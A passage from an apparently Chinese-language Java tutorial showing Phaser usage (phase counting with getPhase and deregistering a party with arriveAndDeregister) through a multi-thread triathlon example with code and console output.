<h2 id="重复使用计数器">重复使用计数器</h2>
<p><code>public final int getPhase()</code> ：获取已执行阶段数（从0开始，每执行一轮，计数器加1）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">practice<span class="token punctuation">.</span>util<span class="token punctuation">.</span>phaser</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">practice<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">TaskFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Phaser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PhaserExample2</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 监控5个运动员（指定parties）</span>
        <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phaser</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">boxed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> phaser<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">Athlete</span><span class="token operator">::</span><span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Athlete</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
        <span class="token comment">// 运动员编号</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">Athlete</span><span class="token punctuation">(</span><span class="token class-name">Phaser</span> phaser<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>phaser <span class="token operator">=</span> phaser<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// step1: 游泳</span>
            <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"phaser.getPhase"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">actionDeal</span><span class="token punctuation">(</span><span class="token string">"swimming"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 等待所有运动员完成游泳任务，继续执行</span>
            phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// step2: 自行车</span>
            <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"phaser.getPhase"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">actionDeal</span><span class="token punctuation">(</span><span class="token string">"bicycle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 等待所有运动员完成自行车任务，继续执行</span>
            phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// step3: 长跑</span>
            <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"phaser.getPhase"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getPhase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">actionDeal</span><span class="token punctuation">(</span><span class="token string">"running"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 等待所有运动员完成长跑任务，继续执行</span>
            phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 finish all tasks."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token class-name">String</span> item<span class="token punctuation">,</span> <span class="token class-name">Object</span> object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t【monitor】【%s】【%d】【%s】%s\n"</span><span class="token punctuation">,</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> item<span class="token punctuation">,</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">actionDeal</span><span class="token punctuation">(</span><span class="token class-name">String</span> taskName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 finish  "</span> <span class="token operator">+</span> taskName <span class="token operator">+</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>执行结果</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【<span class="token number">0</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">0</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】【<span class="token number">0</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">0</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】【<span class="token number">0</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">0</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【<span class="token number">0</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">0</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】【<span class="token number">0</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">0</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 finish  swimming<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】 finish  swimming<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 finish  swimming<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】 finish  swimming<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】 finish  swimming<span class="token punctuation">.</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】【<span class="token number">1</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">1</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【<span class="token number">1</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">1</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】【<span class="token number">1</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">1</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【<span class="token number">1</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">1</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】【<span class="token number">1</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">1</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 finish  bicycle<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】 finish  bicycle<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】 finish  bicycle<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】 finish  bicycle<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 finish  bicycle<span class="token punctuation">.</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【<span class="token number">2</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">2</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】【<span class="token number">2</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">2</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】【<span class="token number">2</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">2</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】【<span class="token number">2</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">2</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【<span class="token number">2</span>】【phaser<span class="token punctuation">.</span>getPhase】<span class="token number">2</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 finish  running<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】 finish  running<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】 finish  running<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 finish  running<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】 finish  running<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】 finish all tasks<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】 finish all tasks<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】 finish all tasks<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 finish all tasks<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 finish all tasks<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="减少计数器（动态销户）">减少计数器（动态销户）</h2>
<p>需要注意：销户之后的<font color="red">return</font>，否则仍然会参与后续流程的计数</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">practice<span class="token punctuation">.</span>common<span class="token punctuation">.</span></span><span class="token class-name">TaskFactory</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">Phaser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>stream<span class="token punctuation">.</span></span><span class="token class-name">IntStream</span></span><span class="token punctuation">;</span>

<span class="token comment">/**
 * Phaser 减少计数器（动态销户）
 */</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PhaserExample3</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 监控5个运动员</span>
        <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phaser</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">IntStream</span><span class="token punctuation">.</span><span class="token function">rangeClosed</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">boxed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>i <span class="token operator">-&gt;</span> phaser<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">Athlete</span><span class="token operator">::</span><span class="token keyword">new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Athlete</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>
        <span class="token comment">// 运动员编号</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">Phaser</span> phaser<span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token class-name">Athlete</span><span class="token punctuation">(</span><span class="token class-name">Phaser</span> phaser<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>phaser <span class="token operator">=</span> phaser<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// step1: 游泳</span>
            <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">actionDeal</span><span class="token punctuation">(</span><span class="token string">"swimming"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// step2: 自行车</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">actionFailed</span><span class="token punctuation">(</span><span class="token string">"bicycle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 运动员退出比赛（退出计数）</span>
                phaser<span class="token punctuation">.</span><span class="token function">arriveAndDeregister</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 退出计数之后，后续流程不在参与重新参与计数</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">actionDeal</span><span class="token punctuation">(</span><span class="token string">"bicycle"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">// step3: 长跑</span>
            <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> phaser<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">actionDeal</span><span class="token punctuation">(</span><span class="token string">"running"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            phaser<span class="token punctuation">.</span><span class="token function">arriveAndAwaitAdvance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 finish all tasks."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">monitor</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token class-name">Phaser</span> phaser<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> formatter <span class="token operator">=</span> <span class="token string">"\t【monitor】【%s】【%d】【%s】%s\n"</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> threadName <span class="token operator">=</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span>formatter<span class="token punctuation">,</span> threadName<span class="token punctuation">,</span> index<span class="token punctuation">,</span> <span class="token string">"RegisteredParties"</span><span class="token punctuation">,</span> phaser<span class="token punctuation">.</span><span class="token function">getRegisteredParties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">actionDeal</span><span class="token punctuation">(</span><span class="token class-name">String</span> taskName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">TaskFactory</span><span class="token punctuation">.</span><span class="token function">spendSeconds</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 finish  "</span> <span class="token operator">+</span> taskName <span class="token operator">+</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">actionFailed</span><span class="token punctuation">(</span><span class="token class-name">String</span> taskName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"【"</span> <span class="token operator">+</span> <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"】 failed  "</span> <span class="token operator">+</span> taskName <span class="token operator">+</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出结果</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【<span class="token number">0</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">5</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】【<span class="token number">0</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">5</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】【<span class="token number">0</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">5</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】【<span class="token number">0</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">5</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【<span class="token number">0</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">5</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】 finish  swimming<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】 finish  swimming<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 finish  swimming<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 finish  swimming<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】 finish  swimming<span class="token punctuation">.</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】【<span class="token number">1</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">5</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【<span class="token number">1</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">5</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】【<span class="token number">1</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">5</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】【<span class="token number">1</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">5</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】【<span class="token number">1</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">5</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】 failed  bicycle<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">2</span>】 withdrew the game<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】 finish  bicycle<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】 finish  bicycle<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">1</span>】 finish  bicycle<span class="token punctuation">.</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】 finish  bicycle<span class="token punctuation">.</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">0</span>】【<span class="token number">2</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">4</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】【<span class="token number">2</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">4</span>
【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">4</span>】 finish  running<span class="token punctuation">.</span>
	【monitor】【<span class="token class-name">Thread</span><span class="token operator">-</span><span class="token number">3</span>】【<span class="token number">2</span>】【<span class="token class-name">RegisteredParties</span>】<span class="token number">4</span>
